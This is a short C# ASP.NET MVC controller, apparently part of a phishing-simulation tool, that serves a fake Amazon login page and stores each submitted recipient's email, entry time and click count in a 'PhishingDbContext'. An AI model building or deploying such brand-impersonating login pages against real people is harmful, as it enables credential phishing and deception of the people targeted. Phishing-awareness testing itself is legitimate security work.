using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class AmazonLoginController : Controller
    {
        PhishingDbContext _context;
        public AmazonLoginController()
        {
            _context = new PhishingDbContext();
        }

        // GET: User/Create
        public ActionResult AmazonLogin()
        {
            return View();
        }

        // POST: User/Create
        [HttpPost]
        public ActionResult AmazonLogin(Recipient recipientModel)
        {
            if (ModelState.IsValid)
            {
                // Eğer aynı e-posta adresine sahip bir kullanıcı varsa güncelle
                var existingUser = _context.Recipients.FirstOrDefault(r => r.Email == recipientModel.Email);
                if (existingUser != null)
                {
                    existingUser.TotalClicks++;
                    existingUser.EnterDate = DateTime.Now;
                    _context.SaveChanges();
                    return RedirectToAction("SendMail", "Home"); // veya başka bir sayfaya yönlendirme
                }

                // Aynı e-posta adresine sahip kullanıcı yoksa yeni kullanıcı ekle
                recipientModel.EnterDate = DateTime.Now;
                _context.Recipients.Add(recipientModel);
                _context.SaveChanges();
                return RedirectToAction("SendMail", "Home"); // veya başka bir sayfaya yönlendirme
            }

            return View(recipientModel);
        }
    }
}